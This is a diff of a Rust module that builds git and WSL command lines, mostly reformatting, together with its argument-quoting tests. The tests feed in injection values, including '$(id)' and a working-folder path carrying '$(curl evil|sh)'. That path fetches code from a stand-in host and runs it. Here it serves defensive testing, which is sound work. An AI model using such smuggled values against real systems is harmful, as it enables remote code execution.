@@ -52,22 +52,9 @@ pub fn strip_wsl_profile_noise(stdout: &str) -> &str {
 /// Each git argument that is a `\\wsl$\<this distro>\...` UNC is translated to its Linux path.
 #[must_use]
 pub fn build_wsl_git_command_line(distro: &str, cwd: &str, git_args: &[&str]) -> String {
-    let mut argv: Vec<String> = vec![
-        "-d".into(),
-        distro.into(),
-        "-e".into(),
-        "sh".into(),
-        "-lc".into(),
-        WSL_GIT_SCRIPT.into(),
-        "git".into(),
-        "-C".into(),
-        cwd.into(),
-    ];
-    argv.extend(
-        git_args
-            .iter()
-            .map(|a| translate_unc_arg_to_linux(a, distro)),
-    );
+    let mut argv: Vec<String> =
+        vec!["-d".into(), distro.into(), "-e".into(), "sh".into(), "-lc".into(), WSL_GIT_SCRIPT.into(), "git".into(), "-C".into(), cwd.into()];
+    argv.extend(git_args.iter().map(|a| translate_unc_arg_to_linux(a, distro)));
     join_argv(&argv)
 }
 
@@ -120,10 +107,7 @@ pub fn translate_linux_paths_to_unc(text: &str, distro: &str) -> String {
     let mut out = String::with_capacity(text.len() + 16);
     let mut i = 0usize;
     while let Some(&c) = chars.get(i) {
-        let boundary = i == 0
-            || chars
-                .get(i - 1)
-                .is_some_and(|&p| p.is_whitespace() || p == '=' || p == ':');
+        let boundary = i == 0 || chars.get(i - 1).is_some_and(|&p| p.is_whitespace() || p == '=' || p == ':');
         if c == '/' && boundary {
             let tail_len = chars.iter().skip(i + 1).take_while(|&&t| !stops(t)).count();
             if tail_len > 0 {
@@ -160,12 +144,7 @@ pub fn git_environment(read_only: bool) -> Vec<(&'static str, &'static str)> {
 /// `WSLENV` lists them. Existing entries (and their `/p`-style flags) are kept.
 #[must_use]
 pub fn merge_wsl_env(existing: Option<&str>, names: &[&str]) -> String {
-    let mut list: Vec<String> = existing
-        .unwrap_or("")
-        .split(':')
-        .filter(|s| !s.is_empty())
-        .map(str::to_string)
-        .collect();
+    let mut list: Vec<String> = existing.unwrap_or("").split(':').filter(|s| !s.is_empty()).map(str::to_string).collect();
     for n in names {
         let present = list.iter().any(|e| e.split('/').next().unwrap_or("") == *n);
         if !present {
@@ -181,15 +160,7 @@ pub fn merge_wsl_env(existing: Option<&str>, names: &[&str]) -> String {
 /// The poll/menu status call: one spawn feeds branch, upstream, ahead/behind and changes.
 #[must_use]
 pub fn status_args() -> Vec<String> {
-    [
-        "-c",
-        "core.quotePath=false",
-        "status",
-        "--porcelain=v2",
-        "--branch",
-    ]
-    .map(String::from)
-    .to_vec()
+    ["-c", "core.quotePath=false", "status", "--porcelain=v2", "--branch"].map(String::from).to_vec()
 }
 
 /// `git fetch`.
@@ -204,9 +175,7 @@ pub fn fetch_args() -> Vec<String> {
 /// changed across versions, and the flag costs nothing).
 #[must_use]
 pub fn pull_ff_only_args() -> Vec<String> {
-    ["pull", "--ff-only", "--no-rebase"]
-        .map(String::from)
-        .to_vec()
+    ["pull", "--ff-only", "--no-rebase"].map(String::from).to_vec()
 }
 
 /// `git switch --no-guess -- <branch>`. A ref can legally be called `-x`: `--` keeps it a
@@ -214,32 +183,20 @@ pub fn pull_ff_only_args() -> Vec<String> {
 /// exists only on a remote.
 #[must_use]
 pub fn switch_args(branch: &str) -> Vec<String> {
-    vec![
-        "switch".into(),
-        "--no-guess".into(),
-        "--".into(),
-        branch.into(),
-    ]
+    vec!["switch".into(), "--no-guess".into(), "--".into(), branch.into()]
 }
 
 /// Human-readable `git status` for the panel.
 #[must_use]
 pub fn status_text_args() -> Vec<String> {
-    ["-c", "color.status=false", "status"]
-        .map(String::from)
-        .to_vec()
+    ["-c", "color.status=false", "status"].map(String::from).to_vec()
 }
 
 /// `git worktree remove -- <path>`, deliberately WITHOUT `--force`: git then refuses a
 /// worktree with modified or untracked files, and a locked one.
 #[must_use]
 pub fn remove_worktree_args(worktree_path: &str) -> Vec<String> {
-    vec![
-        "worktree".into(),
-        "remove".into(),
-        "--".into(),
-        worktree_path.into(),
-    ]
+    vec!["worktree".into(), "remove".into(), "--".into(), worktree_path.into()]
 }
 
 /// `git branch -d -- <branch>`: lower-case `-d`, so git refuses an unmerged branch.
@@ -257,18 +214,14 @@ pub fn prune_worktrees_args() -> Vec<String> {
 /// `git worktree list --porcelain`.
 #[must_use]
 pub fn list_worktrees_args() -> Vec<String> {
-    ["worktree", "list", "--porcelain"]
-        .map(String::from)
-        .to_vec()
+    ["worktree", "list", "--porcelain"].map(String::from).to_vec()
 }
 
 /// Local branches by name (`--format=%(refname:short)` is a bash syntax error under a login
 /// shell, which is why this could never have worked with the old `--` WSL form).
 #[must_use]
 pub fn list_branches_args() -> Vec<String> {
-    ["for-each-ref", "--format=%(refname:short)", "refs/heads"]
-        .map(String::from)
-        .to_vec()
+    ["for-each-ref", "--format=%(refname:short)", "refs/heads"].map(String::from).to_vec()
 }
 
 /// `git rev-parse --git-common-dir`: identical for every worktree of one repo.
@@ -282,39 +235,18 @@ pub fn git_common_dir_args() -> Vec<String> {
 /// ref legitimately named `--force` sitting in `refs/heads` would otherwise be consumed as an
 /// option. Not execution, but a repo deciding which git flags we run.
 #[must_use]
-pub fn worktree_add_args(
-    target_path: &str,
-    branch_or_ref: &str,
-    create_branch: bool,
-) -> Vec<String> {
+pub fn worktree_add_args(target_path: &str, branch_or_ref: &str, create_branch: bool) -> Vec<String> {
     if create_branch {
-        vec![
-            "worktree".into(),
-            "add".into(),
-            "-b".into(),
-            branch_or_ref.into(),
-            "--".into(),
-            target_path.into(),
-        ]
+        vec!["worktree".into(), "add".into(), "-b".into(), branch_or_ref.into(), "--".into(), target_path.into()]
     } else {
-        vec![
-            "worktree".into(),
-            "add".into(),
-            "--".into(),
-            target_path.into(),
-            branch_or_ref.into(),
-        ]
+        vec!["worktree".into(), "add".into(), "--".into(), target_path.into(), branch_or_ref.into()]
     }
 }
 
 /// Splits `for-each-ref` output into branch names (blank lines dropped, CR tolerated).
 #[must_use]
 pub fn parse_branch_list(raw: &str) -> Vec<String> {
-    raw.replace('\r', "")
-        .split('\n')
-        .filter(|l| !l.is_empty())
-        .map(str::to_string)
-        .collect()
+    raw.replace('\r', "").split('\n').filter(|l| !l.is_empty()).map(str::to_string).collect()
 }
 
 /// Turns `rev-parse --git-common-dir` output into the main working tree's root, with forward
@@ -336,30 +268,19 @@ pub fn repo_root_from_common_dir(common_dir: Option<&str>, folder_path: &str) ->
         _ => {
             // git may return a path relative to the cwd (".git" for a plain repo) or an
             // absolute one ("C:/repo/.git" from a worktree).
-            if winpath::is_rooted(trimmed) {
-                trimmed.to_string()
-            } else {
-                winpath::get_full_path(trimmed, folder_path)
-            }
+            if winpath::is_rooted(trimmed) { trimmed.to_string() } else { winpath::get_full_path(trimmed, folder_path) }
         }
     };
 
     // Strip the trailing ".git" segment to get the working tree root.
-    let mut normalized = absolute
-        .replace('\\', "/")
-        .trim_end_matches('/')
-        .to_string();
+    let mut normalized = absolute.replace('\\', "/").trim_end_matches('/').to_string();
     if winpath::ends_with_ic(&normalized, "/.git") {
         normalized.truncate(normalized.len() - "/.git".len());
     } else if winpath::ends_with_ic(&normalized, ".git") {
         normalized.truncate(normalized.len() - ".git".len());
         normalized = normalized.trim_end_matches('/').to_string();
     }
-    if normalized.is_empty() {
-        None
-    } else {
-        Some(normalized)
-    }
+    if normalized.is_empty() { None } else { Some(normalized) }
 }
 
 #[cfg(test)]
@@ -388,10 +309,7 @@ mod tests {
     /// expectation rewritten.
     fn git_argv(command_line: &str) -> Vec<String> {
         let argv = split_command_line(command_line);
-        let g = argv
-            .iter()
-            .position(|a| a == "git")
-            .unwrap_or_else(|| panic!("no `git` in: {command_line}"));
+        let g = argv.iter().position(|a| a == "git").unwrap_or_else(|| panic!("no `git` in: {command_line}"));
         argv[g..].to_vec()
     }
 
@@ -404,24 +322,10 @@ mod tests {
     #[test]
     fn wsl_git_command_line_keeps_each_value_as_exactly_one_argument() {
         for payload in HOSTILE {
-            let cmd = build_wsl_git_command_line(
-                "Ubuntu",
-                "/home/alice/repo",
-                &["worktree", "add", "-b", payload, "--", "/home/alice/wt"],
-            );
+            let cmd = build_wsl_git_command_line("Ubuntu", "/home/alice/repo", &["worktree", "add", "-b", payload, "--", "/home/alice/wt"]);
             assert_eq!(
                 git_argv(&cmd),
-                strs(&[
-                    "git",
-                    "-C",
-                    "/home/alice/repo",
-                    "worktree",
-                    "add",
-                    "-b",
-                    payload,
-                    "--",
-                    "/home/alice/wt"
-                ]),
+                strs(&["git", "-C", "/home/alice/repo", "worktree", "add", "-b", payload, "--", "/home/alice/wt"]),
                 "{payload:?}"
             );
         }
@@ -430,15 +334,8 @@ mod tests {
     #[test]
     fn local_git_command_line_keeps_each_value_as_exactly_one_argument() {
         for payload in HOSTILE {
-            let cmd = build_local_git_command_line(
-                r"C:\repo",
-                &["worktree", "add", "-b", payload, r"C:\wt"],
-            );
-            assert_eq!(
-                split_command_line(&cmd),
-                strs(&["-C", r"C:\repo", "worktree", "add", "-b", payload, r"C:\wt"]),
-                "{payload:?}"
-            );
+            let cmd = build_local_git_command_line(r"C:\repo", &["worktree", "add", "-b", payload, r"C:\wt"]);
+            assert_eq!(split_command_line(&cmd), strs(&["-C", r"C:\repo", "worktree", "add", "-b", payload, r"C:\wt"]), "{payload:?}");
         }
     }
 
@@ -474,11 +371,7 @@ mod tests {
     fn the_shell_script_is_always_the_same_literal() {
         // The safety of the -lc form rests entirely on the script never varying with input.
         for payload in HOSTILE {
-            let cmd = build_wsl_git_command_line(
-                "Ubuntu",
-                payload,
-                &["worktree", "add", "-b", payload, "--", payload],
-            );
+            let cmd = build_wsl_git_command_line("Ubuntu", payload, &["worktree", "add", "-b", payload, "--", payload]);
             let argv = split_command_line(&cmd);
             assert_eq!(argv.iter().filter(|a| *a == WSL_GIT_SCRIPT).count(), 1);
             let lc = argv.iter().position(|a| a == "-lc").unwrap();
@@ -497,10 +390,7 @@ mod tests {
 
     #[test]
     fn everything_after_the_marker_is_kept() {
-        assert_eq!(
-            strip_wsl_profile_noise(&format!("{WSL_OUTPUT_SENTINEL}main\n")),
-            "main\n"
-        );
+        assert_eq!(strip_wsl_profile_noise(&format!("{WSL_OUTPUT_SENTINEL}main\n")), "main\n");
     }
 
     #[test]
@@ -517,10 +407,7 @@ mod tests {
         let s = format!("noise{WSL_OUTPUT_SENTINEL}real");
         assert_eq!(strip_wsl_profile_noise(&s), "real");
         let twice = format!("a{WSL_OUTPUT_SENTINEL}b{WSL_OUTPUT_SENTINEL}c");
-        assert_eq!(
-            strip_wsl_profile_noise(&twice),
-            format!("b{WSL_OUTPUT_SENTINEL}c")
-        );
+        assert_eq!(strip_wsl_profile_noise(&twice), format!("b{WSL_OUTPUT_SENTINEL}c"));
     }
 
     #[test]
@@ -547,32 +434,20 @@ mod tests {
     fn worktree_add_terminates_option_parsing_before_positionals() {
         // git uses permuting parse_options, so a ref legitimately named `--force` sitting in
         // refs/heads would otherwise be consumed as an option rather than a commit-ish.
-        let cmd = build_local_git_command_line(
-            r"C:\repo",
-            &["worktree", "add", "--", r"C:\wt", "--force"],
-        );
+        let cmd = build_local_git_command_line(r"C:\repo", &["worktree", "add", "--", r"C:\wt", "--force"]);
         let argv = split_command_line(&cmd);
         let dash_dash = argv.iter().position(|a| a == "--").unwrap();
         let hostile_ref = argv.iter().position(|a| a == "--force").unwrap();
-        assert!(
-            dash_dash < hostile_ref,
-            "the option terminator must precede any repo-controlled positional"
-        );
+        assert!(dash_dash < hostile_ref, "the option terminator must precede any repo-controlled positional");
     }
 
     #[test]
     fn worktree_add_args_put_the_separator_before_every_positional() {
         for hostile in ["--force", "-x", "$(id)", "a b", "a\"b", "--detach"] {
             let with_branch = worktree_add_args(r"C:\wt", hostile, true);
-            assert_eq!(
-                with_branch,
-                strs(&["worktree", "add", "-b", hostile, "--", r"C:\wt"])
-            );
+            assert_eq!(with_branch, strs(&["worktree", "add", "-b", hostile, "--", r"C:\wt"]));
             let existing = worktree_add_args(r"C:\wt", hostile, false);
-            assert_eq!(
-                existing,
-                strs(&["worktree", "add", "--", r"C:\wt", hostile])
-            );
+            assert_eq!(existing, strs(&["worktree", "add", "--", r"C:\wt", hostile]));
         }
     }
 
@@ -580,21 +455,8 @@ mod tests {
     fn wsl_git_command_line_hostile_working_folder_stays_one_argument() {
         // The unattended half: cwd comes from the session's working folder and is reached by
         // the git poll on a timer, with no user action at all.
-        let cmd = build_wsl_git_command_line(
-            "Ubuntu",
-            "/home/alice/proj$(curl evil|sh)",
-            &["status", "--porcelain"],
-        );
-        assert_eq!(
-            git_argv(&cmd),
-            strs(&[
-                "git",
-                "-C",
-                "/home/alice/proj$(curl evil|sh)",
-                "status",
-                "--porcelain"
-            ])
-        );
+        let cmd = build_wsl_git_command_line("Ubuntu", "/home/alice/proj$(curl evil|sh)", &["status", "--porcelain"]);
+        assert_eq!(git_argv(&cmd), strs(&["git", "-C", "/home/alice/proj$(curl evil|sh)", "status", "--porcelain"]));
     }
 
     #[test]
@@ -605,32 +467,14 @@ mod tests {
 
     #[test]
     fn for_each_ref_format_survives_as_one_argument() {
-        let cmd = build_wsl_git_command_line(
-            "Ubuntu",
-            "/repo",
-            &["for-each-ref", "--format=%(refname:short)", "refs/heads"],
-        );
-        assert_eq!(
-            git_argv(&cmd),
-            strs(&[
-                "git",
-                "-C",
-                "/repo",
-                "for-each-ref",
-                "--format=%(refname:short)",
-                "refs/heads"
-            ])
-        );
+        let cmd = build_wsl_git_command_line("Ubuntu", "/repo", &["for-each-ref", "--format=%(refname:short)", "refs/heads"]);
+        assert_eq!(git_argv(&cmd), strs(&["git", "-C", "/repo", "for-each-ref", "--format=%(refname:short)", "refs/heads"]));
         assert_eq!(list_branches_args()[1], "--format=%(refname:short)");
     }
 
     #[test]
     fn wsl_git_command_line_translates_unc_arguments_per_argument() {
-        let cmd = build_wsl_git_command_line(
-            "Ubuntu",
-            "/repo",
-            &["worktree", "add", r"\\wsl$\Ubuntu\home\alice\my repo"],
-        );
+        let cmd = build_wsl_git_command_line("Ubuntu", "/repo", &["worktree", "add", r"\\wsl$\Ubuntu\home\alice\my repo"]);
         let argv = split_command_line(&cmd);
         assert_eq!(argv.last().unwrap(), "/home/alice/my repo");
     }
@@ -666,88 +510,40 @@ mod tests {
             let refs: Vec<&str> = sw.iter().map(String::as_str).collect();
             let cmd = build_local_git_command_line(r"C:\repo", &refs);
             let argv = split_command_line(&format!("git {cmd}"));
-            assert_eq!(
-                argv,
-                strs(&[
-                    "git",
-                    "-C",
-                    r"C:\repo",
-                    "switch",
-                    "--no-guess",
-                    "--",
-                    branch
-                ])
-            );
+            assert_eq!(argv, strs(&["git", "-C", r"C:\repo", "switch", "--no-guess", "--", branch]));
         }
     }
 
     #[test]
     fn wsl_env_gains_the_git_variables_once_and_keeps_existing_entries() {
-        assert_eq!(
-            merge_wsl_env(None, &["GIT_TERMINAL_PROMPT", "GIT_OPTIONAL_LOCKS"]),
-            "GIT_TERMINAL_PROMPT:GIT_OPTIONAL_LOCKS"
-        );
-        assert_eq!(
-            merge_wsl_env(Some("USERPROFILE/p"), &["GIT_TERMINAL_PROMPT"]),
-            "USERPROFILE/p:GIT_TERMINAL_PROMPT"
-        );
-        assert_eq!(
-            merge_wsl_env(Some("GIT_TERMINAL_PROMPT/u"), &["GIT_TERMINAL_PROMPT"]),
-            "GIT_TERMINAL_PROMPT/u"
-        );
+        assert_eq!(merge_wsl_env(None, &["GIT_TERMINAL_PROMPT", "GIT_OPTIONAL_LOCKS"]), "GIT_TERMINAL_PROMPT:GIT_OPTIONAL_LOCKS");
+        assert_eq!(merge_wsl_env(Some("USERPROFILE/p"), &["GIT_TERMINAL_PROMPT"]), "USERPROFILE/p:GIT_TERMINAL_PROMPT");
+        assert_eq!(merge_wsl_env(Some("GIT_TERMINAL_PROMPT/u"), &["GIT_TERMINAL_PROMPT"]), "GIT_TERMINAL_PROMPT/u");
     }
 
     #[test]
     fn every_git_never_prompts_and_reads_skip_optional_locks() {
         assert!(git_environment(false).contains(&("GIT_TERMINAL_PROMPT", "0")));
-        assert!(
-            !git_environment(false)
-                .iter()
-                .any(|(k, _)| *k == "GIT_OPTIONAL_LOCKS")
-        );
+        assert!(!git_environment(false).iter().any(|(k, _)| *k == "GIT_OPTIONAL_LOCKS"));
         assert!(git_environment(true).contains(&("GIT_OPTIONAL_LOCKS", "0")));
     }
 
     #[test]
     fn remove_and_branch_delete_argv_keep_values_as_one_element_after_dashdash() {
         for hostile in ["-x", "--force", "$(id)", "a b", "a\"b"] {
-            assert_eq!(
-                remove_worktree_args(hostile),
-                strs(&["worktree", "remove", "--", hostile])
-            );
-            assert_eq!(
-                delete_merged_branch_args(hostile),
-                strs(&["branch", "-d", "--", hostile])
-            );
+            assert_eq!(remove_worktree_args(hostile), strs(&["worktree", "remove", "--", hostile]));
+            assert_eq!(delete_merged_branch_args(hostile), strs(&["branch", "-d", "--", hostile]));
         }
     }
 
     #[test]
     fn fixed_argv_shapes() {
-        assert_eq!(
-            status_args(),
-            strs(&[
-                "-c",
-                "core.quotePath=false",
-                "status",
-                "--porcelain=v2",
-                "--branch"
-            ])
-        );
-        assert_eq!(
-            pull_ff_only_args(),
-            strs(&["pull", "--ff-only", "--no-rebase"])
-        );
+        assert_eq!(status_args(), strs(&["-c", "core.quotePath=false", "status", "--porcelain=v2", "--branch"]));
+        assert_eq!(pull_ff_only_args(), strs(&["pull", "--ff-only", "--no-rebase"]));
         assert_eq!(fetch_args(), strs(&["fetch"]));
         assert_eq!(prune_worktrees_args(), strs(&["worktree", "prune"]));
-        assert_eq!(
-            list_worktrees_args(),
-            strs(&["worktree", "list", "--porcelain"])
-        );
-        assert_eq!(
-            status_text_args(),
-            strs(&["-c", "color.status=false", "status"])
-        );
+        assert_eq!(list_worktrees_args(), strs(&["worktree", "list", "--porcelain"]));
+        assert_eq!(status_text_args(), strs(&["-c", "color.status=false", "status"]));
         // never --force, never -D
         assert!(!remove_worktree_args("x").contains(&"--force".to_string()));
         assert!(!delete_merged_branch_args("x").contains(&"-D".to_string()));
@@ -755,10 +551,7 @@ mod tests {
 
     #[test]
     fn branch_list_parsing() {
-        assert_eq!(
-            parse_branch_list("main\r\nfeat/x\n\n"),
-            strs(&["main", "feat/x"])
-        );
+        assert_eq!(parse_branch_list("main\r\nfeat/x\n\n"), strs(&["main", "feat/x"]));
         assert!(parse_branch_list("").is_empty());
     }
 
@@ -768,11 +561,7 @@ mod tests {
     fn try_parse_wsl_unc_known_shapes() {
         for (path, distro, linux) in [
             (r"\\wsl$\Ubuntu\home\alice", Some("Ubuntu"), "/home/alice"),
-            (
-                r"\\wsl.localhost\Debian\srv\app",
-                Some("Debian"),
-                "/srv/app",
-            ),
+            (r"\\wsl.localhost\Debian\srv\app", Some("Debian"), "/srv/app"),
             (r"\\wsl$\Ubuntu", Some("Ubuntu"), "/"),
             (r"C:\proj", None, ""),
             ("", None, ""),
@@ -785,10 +574,7 @@ mod tests {
 
     #[test]
     fn translate_unc_arg_matching_distro_substitutes() {
-        assert_eq!(
-            translate_unc_arg_to_linux(r"\\wsl$\Ubuntu\home\alice\proj-foo", "Ubuntu"),
-            "/home/alice/proj-foo"
-        );
+        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\Ubuntu\home\alice\proj-foo", "Ubuntu"), "/home/alice/proj-foo");
     }
 
     #[test]
@@ -801,10 +587,7 @@ mod tests {
 
     #[test]
     fn translate_unc_arg_non_path_args_pass_through() {
-        assert_eq!(
-            translate_unc_arg_to_linux("--show-current", "Ubuntu"),
-            "--show-current"
-        );
+        assert_eq!(translate_unc_arg_to_linux("--show-current", "Ubuntu"), "--show-current");
         assert_eq!(translate_unc_arg_to_linux("branch", "Ubuntu"), "branch");
         assert_eq!(translate_unc_arg_to_linux("", "Ubuntu"), "");
     }
@@ -842,10 +625,7 @@ mod tests {
 
     #[test]
     fn translate_unc_arg_path_with_spaces_translated_whole() {
-        assert_eq!(
-            translate_unc_arg_to_linux(r"\\wsl$\Ubuntu\home\alice\my repo", "Ubuntu"),
-            "/home/alice/my repo"
-        );
+        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\Ubuntu\home\alice\my repo", "Ubuntu"), "/home/alice/my repo");
     }
 
     #[test]
@@ -859,10 +639,7 @@ mod tests {
         // half-translated.
         let raw = "worktree /home/alice/My Projects/repo\n";
         let t = translate_linux_paths_to_unc(raw, "Ubuntu");
-        assert!(
-            t.contains(r"\\wsl$\Ubuntu\home\alice\My Projects\repo"),
-            "{t}"
-        );
+        assert!(t.contains(r"\\wsl$\Ubuntu\home\alice\My Projects\repo"), "{t}");
         assert!(!t.contains("Projects/repo")); // no leftover forward slashes
     }
 
@@ -875,35 +652,20 @@ mod tests {
 
     #[test]
     fn translate_unc_arg_case_insensitive_distro_match() {
-        assert_eq!(
-            translate_unc_arg_to_linux(r"\\wsl$\ubuntu\home\alice", "Ubuntu"),
-            "/home/alice"
-        );
+        assert_eq!(translate_unc_arg_to_linux(r"\\wsl$\ubuntu\home\alice", "Ubuntu"), "/home/alice");
     }
 
     #[test]
     fn translate_linux_paths_stops_at_quotes_and_pipes_and_needs_a_boundary() {
         // equivalent of the regex tail class
-        assert_eq!(
-            translate_linux_paths_to_unc("x=/a/b'c", "D"),
-            r"x=\\wsl$\D\a\b'c"
-        );
+        assert_eq!(translate_linux_paths_to_unc("x=/a/b'c", "D"), r"x=\\wsl$\D\a\b'c");
         assert_eq!(translate_linux_paths_to_unc("a/b", "D"), "a/b");
         assert_eq!(translate_linux_paths_to_unc("/", "D"), "/");
-        assert_eq!(
-            translate_linux_paths_to_unc("p:/a|/b", "D"),
-            r"p:\\wsl$\D\a|/b"
-        );
+        assert_eq!(translate_linux_paths_to_unc("p:/a|/b", "D"), r"p:\\wsl$\D\a|/b");
         // consecutive lines each qualify
-        assert_eq!(
-            translate_linux_paths_to_unc("/a\r\n/b", "D"),
-            "\\\\wsl$\\D\\a\r\n\\\\wsl$\\D\\b"
-        );
+        assert_eq!(translate_linux_paths_to_unc("/a\r\n/b", "D"), "\\\\wsl$\\D\\a\r\n\\\\wsl$\\D\\b");
         // non-ASCII is carried through intact
-        assert_eq!(
-            translate_linux_paths_to_unc("/é ü", "D"),
-            "\\\\wsl$\\D\\é ü"
-        );
+        assert_eq!(translate_linux_paths_to_unc("/é ü", "D"), "\\\\wsl$\\D\\é ü");
     }
 
     // ── repo root from `rev-parse --git-common-dir` (#181) ─────────────────────────────
@@ -914,47 +676,28 @@ mod tests {
         // Main checkout: git answers relative to the cwd.
         let main = repo_root_from_common_dir(Some(".git\n"), r"\\wsl$\Ubuntu\home\u\repo");
         // Linked worktree, Linux-absolute (as git prints it inside the distro).
-        let linked_raw =
-            repo_root_from_common_dir(Some("/home/u/repo/.git\n"), r"\\wsl$\Ubuntu\home\u\repo-wt");
+        let linked_raw = repo_root_from_common_dir(Some("/home/u/repo/.git\n"), r"\\wsl$\Ubuntu\home\u\repo-wt");
         // Linked worktree, already mapped to UNC by the stdout translation.
-        let linked_unc = repo_root_from_common_dir(
-            Some(r"\\wsl$\Ubuntu\home\u\repo\.git"),
-            r"\\wsl.localhost\Ubuntu\home\u\repo-wt",
-        );
+        let linked_unc = repo_root_from_common_dir(Some(r"\\wsl$\Ubuntu\home\u\repo\.git"), r"\\wsl.localhost\Ubuntu\home\u\repo-wt");
 
         assert_eq!(main.as_deref(), Some("//wsl$/Ubuntu/home/u/repo"));
         assert_eq!(main, linked_raw);
         assert_eq!(main, linked_unc);
-        assert_eq!(
-            busy_key(main.as_deref(), None),
-            busy_key(linked_raw.as_deref(), None)
-        );
+        assert_eq!(busy_key(main.as_deref(), None), busy_key(linked_raw.as_deref(), None));
     }
 
     #[test]
     fn repo_root_local_shapes() {
         for (common, folder, expected) in [
             (Some(".git"), r"C:\src\app", Some("C:/src/app")),
-            (
-                Some("C:/src/app/.git"),
-                r"C:\src\app-wt",
-                Some("C:/src/app"),
-            ),
-            (
-                Some(r"C:\src\bare.git"),
-                r"C:\src\bare.git",
-                Some("C:/src/bare"),
-            ),
+            (Some("C:/src/app/.git"), r"C:\src\app-wt", Some("C:/src/app")),
+            (Some(r"C:\src\bare.git"), r"C:\src\bare.git", Some("C:/src/bare")),
             (Some(""), r"C:\src\app", None),
             (None, r"C:\src\app", None),
             (Some("   "), r"C:\src\app", None),
             (Some("../other/.git"), r"C:\src\app", Some("C:/src/other")),
         ] {
-            assert_eq!(
-                repo_root_from_common_dir(common, folder).as_deref(),
-                expected,
-                "{common:?} {folder}"
-            );
+            assert_eq!(repo_root_from_common_dir(common, folder).as_deref(), expected, "{common:?} {folder}");
         }
     }
 }
